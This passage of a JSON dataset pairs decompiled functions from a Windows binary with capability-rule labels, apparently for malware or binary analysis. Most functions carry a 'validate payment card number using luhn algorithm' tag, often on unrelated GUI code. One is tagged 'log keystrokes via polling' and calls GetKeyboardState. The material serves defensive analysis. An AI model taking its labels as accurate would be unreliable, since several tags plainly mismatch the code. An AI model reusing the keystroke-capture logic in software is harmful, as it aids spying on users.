        "decompiled_code": "\nint32_t fcn.00453b18(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (*(in_EAX + 0x1cc) != 0) {\n        iVar1 = *(*(in_EAX + 0x1cc) + 8);\n    }\n    if (*(in_EAX + 0x1d0) != 0) {\n        iVar1 = iVar1 + *(*(in_EAX + 0x1d0) + 8);\n    }\n    return iVar1;\n}\n",
        "token_count": 128
    },
    "00453ba8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453ba8(uint param_1, ushort param_2)\n\n{\n    fcn.00453b38(param_2, 0, 0, 0);\n    return;\n}\n",
        "token_count": 47
    },
    "004540f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004540f4(uint param_1, int32_t *param_2)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00451624();\n    uVar2 = 0x453f74;\n    uVar1 = 0x453fac;\n    uVar3 = in_EAX;\n    fcn.00454014(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar1, in_EAX, uVar2, uVar3);\n    return;\n}\n",
        "token_count": 147
    },
    "00454438": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00454438(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x45444e;\n    fcn.0040483c();\n    puStack20 = 0x45445b;\n    fcn.00458dc8();\n    uStack24 = 0x454494;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    (**(*in_EAX + 0xb0))();\n    fcn.004545e8();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x45449b;\n    uStack24 = 0x454493;\n    fcn.00458dc8();\n    return;\n}\n",
        "token_count": 209
    },
    "00454924": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "log keystrokes via polling"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00454924(int32_t param_1, int32_t param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t in_stack_fffffec4;\n    int16_t iStack300;\n    int16_t iStack298;\n    int32_t iStack296;\n    int32_t iStack292;\n    uchar auStack44 [4];\n    int32_t iStack40;\n    int32_t iStack36;\n    uint32_t uStack32;\n    uchar uStack28;\n    uint uStack24;\n    \n    sub.user32.dll_GetMessagePos();\n    uVar2 = fcn.004077e0();\n    iStack300 = uVar2;\n    iStack296 = iStack300;\n    iStack298 = uVar2 >> 0x10;\n    iStack292 = iStack298;\n    iStack36 = 0x454960;\n    fcn.0044f804();\n    if (param_1 == 0) {\n        iStack36 = 0;\n        in_stack_fffffec4 = 0;\n        param_1 = fcn.00454860(0, 0);\n    }\n    if (param_1 == 0) {\n        return 0;\n    }\n    iStack40 = in_stack_fffffec4;\n    if (in_EAX != param_1) {\n        iStack40 = in_stack_fffffec4 - *(param_1 + 0x40);\n        iStack36 = iStack36 - *(param_1 + 0x44);\n    }\n    uStack32 = *(param_2 + 8);\n    uStack24 = *(param_2 + 4);\n    uVar3 = *(param_2 + 10);\n    if (uVar3 < 0x201) {\n        if (uVar3 - 0xa1 < 2) {\ncode_r0x00454a05:\n            uStack28 = 0;\n            goto code_r0x00454a2b;\n        }\n        if (uVar3 - 0xa4 < 2) {\ncode_r0x00454a19:\n            uStack28 = 1;\n            goto code_r0x00454a2b;\n        }\n        uVar3 = uVar3 - 0xa7;\n    }\n    else {\n        if (uVar3 - 0x201 < 2) goto code_r0x00454a05;\n        if (uVar3 - 0x204 < 2) goto code_r0x00454a19;\n        uVar3 = uVar3 - 0x207;\n    }\n    if (uVar3 < 2) {\n        uStack28 = 2;\n    }\n    else {\n        uStack28 = 0;\n    }\ncode_r0x00454a2b:\n    sub.user32.dll_GetKeyboardState(&stack0xfffffed8);\n    uVar1 = fcn.0043b0a8();\n    uStack32._0_2_ = CONCAT11(uVar1, uStack32);\n    uStack32 = uStack32 & 0xffff0000 | uStack32;\n    uVar2 = fcn.00450f7c(&stack0xffffffd4);\n    *(param_2 + 0xc) = uVar2;\n    return 1;\n}\n",
        "token_count": 753
    },
    "0045514c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0045514c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.0044c724();\n    if (iVar1 != 0) {\n        uVar2 = fcn.00450f7c(*(param_2 + 8));\n        *(param_2 + 0xc) = uVar2;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 107
    },
    "004555f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004555f8(uint param_1, int32_t *param_2)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    int32_t *arg_ch;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_18h;\n    uint nSavedDC;\n    int32_t *nLeftRect;\n    uint hdc;\n    \n    puStack36 = 0x45560d;\n    nLeftRect = param_2;\n    hdc = in_EAX;\n    nSavedDC = sub.gdi32.dll_SaveDC();\n    uStack40 = 0x45568e;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    sub.gdi32.dll_ExcludeClipRect(hdc, *nLeftRect + 2, nLeftRect[1] + 2, nLeftRect[2] + -2, nLeftRect[3] + -2);\n    fcn.00431640();\n    fcn.004318b0();\n    arg_8h = 0;\n    arg_ch = nLeftRect;\n    fcn.00431640();\n    fcn.00431804(arg_8h, arg_ch);\n    *in_FS_OFFSET = arg_8h;\n    sub.gdi32.dll_RestoreDC(hdc, nSavedDC, 0x455695);\n    return;\n}\n",
        "token_count": 330
    },
    "00456318": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456318(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0040483c();\n    fcn.0040483c(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 76
    },
    "00457404": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00457404(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_3ch;\n    uint var_2ch;\n    uint var_10h;\n    \n    if ((((in_EDX == in_EAX[0x10]) && (in_ECX == in_EAX[0x11])) && (arg_ch == in_EAX[0x12])) && (arg_8h == in_EAX[0x13])\n       ) {\n        return;\n    }\n    cVar1 = fcn.00457d34();\n    if ((cVar1 == '\\0') || (iVar2 = sub.user32.dll_IsIconic(in_EAX[0x6d]),  iVar2 != 0)) {\n        in_EAX[0x10] = in_EDX;\n        in_EAX[0x11] = in_ECX;\n        in_EAX[0x12] = arg_ch;\n        in_EAX[0x13] = arg_8h;\n        cVar1 = fcn.00457d34();\n        if (cVar1 != '\\0') {\n            var_2ch = 0x2c;\n            sub.user32.dll_GetWindowPlacement(in_EAX[0x6d], &var_2ch);\n            fcn.0044f5e4();\n            sub.user32.dll_SetWindowPlacement();\n        }\n    }\n    else {\n        sub.user32.dll_SetWindowPos(in_EAX[0x6d], 0);\n    }\n    fcn.0044f1d0();\n    fcn.0045285c();\n    (**(*in_EAX + 0x5c))();\n    return;\n}\n",
        "token_count": 404
    },
    "004574e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004574e0(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00453b18(param_2, param_1);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00453adc();\n            fcn.0040483c();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "0045792c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045792c(void)\n\n{\n    int32_t in_EAX;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar auStack20 [16];\n    \n    puStack32 = &stack0xffffffec;\n    uStack24 = 0x45793b;\n    fcn.0044f5e4();\n    uStack24 = 1;\n    uStack28 = 1;\n    sub.user32.dll_InflateRect();\n    sub.user32.dll_InvalidateRect(*(*(in_EAX + 0x30) + 0x1b4), &stack0xffffffe0, 0xffffffff);\n    return;\n}\n",
        "token_count": 149
    },
    "00457d40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00457d40(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iStack116;\n    uchar *puStack112;\n    int32_t iStack108;\n    uchar *puStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack60;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    uStack76 = *(in_EAX + 0x1b4);\n    puStack80 = 0x457d54;\n    iVar1 = sub.user32.dll_IsIconic();\n    if (iVar1 == 0) {\n        uStack84 = *(in_EAX + 0x1b4);\n        uStack88 = 0x457d8a;\n        puStack80 = &stack0xffffffb4;\n        sub.user32.dll_GetWindowRect();\n    }\n    else {\n        uStack60 = 0x2c;\n        puStack80 = &stack0xffffffc4;\n        uStack84 = *(in_EAX + 0x1b4);\n        uStack88 = 0x457d71;\n        sub.user32.dll_GetWindowPlacement();\n        uStack84 = uStack40;\n        puStack80 = puStack36;\n        uStack76 = uStack32;\n        uStack72 = uStack28;\n    }\n    uStack88 = 0xfffffff0;\n    uStack92 = *(in_EAX + 0x1b4);\n    uStack96 = 0x457d98;\n    uVar2 = sub.user32.dll_GetWindowLongA();\n    if ((uVar2 & 0x40000000) != 0) {\n        uStack96 = 0xfffffff8;\n        uStack100 = *(in_EAX + 0x1b4);\n        puStack104 = 0x457dad;\n        iVar1 = sub.user32.dll_GetWindowLongA();\n        if (iVar1 != 0) {\n            sub.user32.dll_ScreenToClient();\n            sub.user32.dll_ScreenToClient();\n            iStack116 = iVar1;\n            puStack112 = &stack0xffffff9c;\n            iStack108 = iVar1;\n            puStack104 = &stack0xffffff9c;\n        }\n    }\n    *(in_EAX + 0x40) = iStack116;\n    *(in_EAX + 0x44) = puStack112;\n    *(in_EAX + 0x48) = iStack108 - iStack116;\n    *(in_EAX + 0x4c) = puStack104 - puStack112;\n    fcn.0044f1d0();\n    return;\n}\n",
        "token_count": 639
    },
    "00457f90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00457f90(code *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00453b18();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.00453adc();\n            if (*(iVar2 + 4) == in_EDX) {\n                (*arg_8h)();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 148
    },
    "00458fe4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00458fe4(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    uStack16 = 0x458ff5;\n    var_4h = in_EAX;\n    uStack16 = fcn.00457a28();\n    puStack20 = 0x458ffb;\n    var_8h = sub.user32.dll_GetWindowDC();\n    uStack24 = 0x45903a;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    (**(*var_4h + 0xdc))();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x459041;\n    uStack24 = var_8h;\n    uStack28 = 0x459033;\n    uStack28 = fcn.00457a28();\n    sub.user32.dll_ReleaseDC();\n    return;\n}\n",
        "token_count": 257
    },
    "00459048": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00459048(void)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x4590e1;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    (**(*in_EAX + 0x44))();\n    var_10h = var_10h + 2;\n    var_ch = var_ch + 2;\n    fcn.00423f70();\n    uVar1 = fcn.0045260c();\n    fcn.0044fcc4(0xffffffff, &var_10h, uVar1 | 0x810);\n    uVar2 = fcn.004058fc();\n    uVar2 = fcn.00424ec0(uVar2);\n    sub.user32.dll_DrawTextA();\n    *in_FS_OFFSET = uVar2;\n    fcn.0040546c(0x4590e8);\n    return;\n}\n",
        "token_count": 282
    },
    "004593ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004593ec(void)\n\n{\n    int32_t *in_EAX;\n    uint var_10h;\n    \n    (**(*in_EAX + 0xe0))();\n    return;\n}\n",
        "token_count": 45
    },
    "00459414": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00459414(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    fcn.00418388(arg_8h, 0);\n    uVar1 = fcn.0045260c();\n    uVar2 = fcn.004058fc(0xffffffff, arg_8h, uVar1 | 0xc10);\n    uVar2 = fcn.00424ec0(uVar2);\n    sub.user32.dll_DrawTextA(uVar2);\n    *(arg_8h + 8) = *(arg_8h + 8) + 6;\n    *(arg_8h + 0xc) = *(arg_8h + 0xc) + 2;\n    return;\n}\n",
        "token_count": 180
    },
    "00459504": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00459504(int32_t *arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t lpRect;\n    int32_t var_14h;\n    uint lpPoint;\n    uint var_4h;\n    \n    sub.user32.dll_ClientToScreen();\n    sub.user32.dll_GetWindowRect();\n    *arg_8h = in_EDX - lpRect;\n    arg_8h[1] = in_ECX - var_14h;\n    return;\n}\n",
        "token_count": 119
    },
    "0045990c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045990c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x1c) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "0045ade4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045ade4(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t in_EDX;\n    uint arg_8h_00;\n    uint *arg_ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.00418388(&var_1ch, *(*(arg_8h + -4) + 0x18) + in_EDX + -2);\n    fcn.00431640();\n    cVar1 = fcn.00431748();\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.00424ec0(&var_1ch, 1, 0);\n        sub.user32.dll_DrawFrameControl(uVar2);\n    }\n    else {\n        fcn.00431640();\n        fcn.00431988();\n        arg_ch = &var_1ch;\n        arg_8h_00 = 0;\n        uVar2 = fcn.00424ec0();\n        fcn.00431640(uVar2);\n        fcn.00431804(arg_8h_00, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 261
    },
    "0045af00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045af00(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint arg_8h_00;\n    uint *arg_ch_00;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.00418388(&var_1ch, arg_8h);\n    fcn.00431640();\n    fcn.004318ec();\n    arg_ch_00 = &var_1ch;\n    arg_8h_00 = 0;\n    uVar1 = fcn.00424ec0();\n    fcn.00431640(uVar1);\n    fcn.00431804(arg_8h_00, arg_ch_00);\n    return;\n}\n",
        "token_count": 168
    },
    "0045bc3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045bc3c(uint *param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    \n    uVar1 = *param_1;\n    uVar2 = param_1[1];\n    *(in_EAX + 0x60) = param_2;\n    fcn.00457a28(uVar1, uVar2);\n    fcn.0045ca6c();\n    uVar1 = fcn.00457a28();\n    *(in_EAX + 0x5c) = uVar1;\n    uVar3 = 0;\n    uVar2 = sub.user32.dll_GetDCEx(uVar1, 0, 0x412);\n    *(in_EAX + 0x58) = uVar2;\n    *(in_EAX + 0x50) = uVar1;\n    *(in_EAX + 0x54) = uVar3;\n    fcn.0045bd64();\n    return;\n}\n",
        "token_count": 237
    },
    "0045bee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045bee0(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (*(param_2 + 0xc) == 0) {\n        var_8h = fcn.00459e88();\n        iVar1 = fcn.004599e8();\n        var_8h = var_8h + iVar1;\n    }\n    else {\n        var_8h = fcn.00459e88();\n    }\n    fcn.0045be50(&stack0xfffffffc);\n    return var_8h;\n}\n",
        "token_count": 149
    },
    "0045bf30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045bf30(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar2 = 4;\n    if (param_2 != 0) {\n        fcn.0044f5e4();\n        fcn.0044f5e4();\n        if (((var_1ch < var_ch) || (var_14h <= var_4h)) || (var_8h < var_18h)) {\n            if (((var_20h < var_10h) || (var_18h <= var_8h)) || (var_4h < var_14h)) {\n                iVar1 = var_1ch + var_14h >> 1;\n                if (iVar1 < 0) {\n                    iVar1 = iVar1 + ((var_1ch + var_14h & 1U) != 0);\n                }\n                if (iVar1 <= var_ch) {\n                    uVar2 = 2;\n                }\n            }\n            else {\n                uVar2 = 3;\n            }\n        }\n        else {\n            uVar2 = 1;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 337
    },
    "0045c164": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045c164(char param_1)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.0045a1dc();\n    if (iVar1 == 0) {\n        if (param_1 != '\\0') {\n            fcn.00418360();\n            iVar1 = fcn.0045a9c0();\n            if (iVar1 == 0) {\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = *(iVar1 + 4);\n            }\n            fcn.0045bf30(uVar2);\n            (**(*in_EAX + 0xc))();\n        }\n    }\n    else {\n        if (param_1 == '\\0') {\n            fcn.0045bfac(&stack0xfffffffc);\n        }\n        else {\n            fcn.0045c02c(&stack0xfffffffc);\n        }\n        (**(*in_EAX[5] + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 254
    },
    "0045c484": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045c484(uint param_1, uint param_2)\n\n{\n    fcn.00403444(param_2, param_1);\n    return;\n}\n",
        "token_count": 41
    },
    "0045c4b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0045c4b4(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iStack12;\n    \n    if (param_1 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.00403444(param_2);\n        iStack12 = param_1;\n    }\n    return CONCAT44(iStack12, uVar1);\n}\n",
        "token_count": 104
    },
    "0045c7d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045c7d0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_EAX;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x45c8b1;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    iVar4 = (**(*in_EAX + 8))();\n    if (var_10h == 0x12) {\n        fcn.0040546c();\n    }\n    else if ((iVar4 != 0) && ((var_10h == 2 || (var_10h == 0x14)))) {\n        fcn.0044f5e4();\n        (***in_EAX)();\n        iVar2 = *(iVar4 + 0x40) * 2 - var_20h;\n        iVar3 = *(iVar4 + 0x44) * 2 - var_1ch;\n        iVar1 = *(iVar4 + 0x48);\n        iVar4 = *(iVar4 + 0x4c);\n        fcn.0044fcc4();\n        fcn.004054c0();\n        *in_ECX = iVar2;\n        in_ECX[1] = iVar3;\n        in_ECX[2] = iVar1 * -2 + var_18h * 3 + iVar2 * -2;\n        in_ECX[3] = iVar4 * -2 + var_14h * 3 + iVar3 * -2;\n    }\n    *in_FS_OFFSET = uStack64;\n    puStack56 = 0x45c8b8;\n    uStack60 = 0x45c8b0;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 512
    },
    "0045cf10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0045cf10(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffac;\n    uint *puVar3;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_10h = 0;\n    var_4h = 0;\n    uStack48 = 0x45d088;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack52;\n    puVar3 = &var_4h;\n    var_ch = sub.kernel32.dll_GetCurrentProcessId();\n    var_8h._0_1_ = 0;\n    fcn.0040af7c(puVar3);\n    fcn.004054c0();\n    uVar1 = fcn.004058fc();\n    *0x497c68 = sub.kernel32.dll_GlobalAddAtomA(uVar1);\n    puVar3 = &var_10h;\n    sub.kernel32.dll_GetCurrentThreadId_1();\n    fcn.0040af7c(puVar3);\n    fcn.004054c0();\n    uVar1 = fcn.004058fc();\n    *0x497c6a = sub.kernel32.dll_GlobalAddAtomA(uVar1);\n    uVar1 = fcn.004058fc();\n    *0x497c74 = sub.user32.dll_RegisterWindowMessageA(uVar1);\n    *0x497cac = fcn.004199f0();\n    fcn.0045cb18();\n    *0x497c54 = fcn.0045c8c4();\n    uVar1 = fcn.00442f70();\n    **0x492ad4 = uVar1;\n    uVar1 = fcn.00444178();\n    **0x49291c = uVar1;\n    fcn.004461cc();\n    fcn.004191a0();\n    iVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x45d0c4);\n    if (iVar2 != 0) {\n        *0x491630 = sub.kernel32.dll_GetProcAddress_1(iVar2, 0x45d0cc);\n        in_stack_ffffffac = iVar2;\n    }\n    *in_FS_OFFSET = in_stack_ffffffac;\n    fcn.0040546c(0x45d08f);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 623
    },
    "0045d0dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0045d0dc(int32_t param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    in_EAX[1] = param_1;\n    (**(*in_EAX + 0x14))();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 181
    },
    "0045d894": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045d894(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    \n    cVar1 = fcn.004046f4();\n    if (cVar1 == '\\0') {\n        cVar1 = sub.ole32.dll_IsEqualGUID(arg_ch, *(*(arg_8h + 4) + 0x30) + 0x20);\n        if (cVar1 == '\\0') {\n            uVar2 = 0x80004002;\n        }\n        else {\n            fcn.004046f4();\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 174
    },
    "0045d868": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045d868(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 4) = param_1;\n    *(in_EAX + 8) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "0045e9b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045e9b8(void)\n\n{\n    fcn.0045ea14();\n    fcn.0045eb5c();\n    return;\n}\n",
        "token_count": 37
    },
    "0045e9dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
